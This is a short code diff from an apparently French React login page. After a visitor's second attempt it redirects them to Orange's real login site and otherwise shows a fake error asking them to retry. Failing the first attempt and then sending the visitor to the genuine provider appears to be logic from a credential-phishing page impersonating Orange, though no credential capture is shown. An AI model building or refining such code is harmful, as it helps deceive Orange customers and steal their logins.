@@ -58,7 +58,7 @@ function Home() {
       // Vérifier si c'est la 2e tentative
       if (attemptCount + 1 === 2) {
         navigate(
-          "https://captcha.orange.fr/?csid=693befe8-6b77-4bbf-9a1d-76ccf12c0e48&captchaService=idme"
+          "https://login.orange.fr/"
         );
       } else {
         alert("Erreur !!! veuillez réessayer.");
